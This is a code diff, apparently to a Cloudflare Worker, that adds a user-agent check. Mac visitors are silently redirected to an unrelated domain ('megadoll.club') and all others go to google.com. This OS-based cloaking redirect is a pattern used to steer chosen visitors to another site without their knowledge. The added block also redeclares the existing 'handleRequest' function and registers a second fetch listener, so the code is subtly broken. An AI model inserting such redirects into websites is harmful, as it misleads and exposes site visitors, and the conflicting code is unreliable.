@@ -1,3 +1,34 @@
+// sistema operativo inicio
+
+addEventListener("fetch", (event) => {
+  event.respondWith(handleRequest(event.request));
+});
+
+async function handleRequest(request) {
+  const userAgent = request.headers.get("user-agent").toLowerCase();
+
+  let redirectUrl;
+
+  if (userAgent.includes("windows")) {
+    redirectUrl = "https://www.google.com";
+  } else if (userAgent.includes("mac")) {
+    redirectUrl = "https://megadoll.club";
+  } else if (userAgent.includes("linux")) {
+    redirectUrl = "https://www.google.com";
+  } else {
+    redirectUrl = "https://www.google.com"; // Fallback
+  }
+
+  return Response.redirect(redirectUrl, 302);
+}
+
+
+// sistema operativo fin
+
+
+// restricciones comienzo
+
+
 addEventListener("fetch", event => {
     event.respondWith(handleRequest(event.request));
 });
@@ -49,3 +80,5 @@ async function handleRequest(request) {
     // Para otros tipos de contenido, devolver la respuesta original
     return response;
 }
+
+// restricciones fin
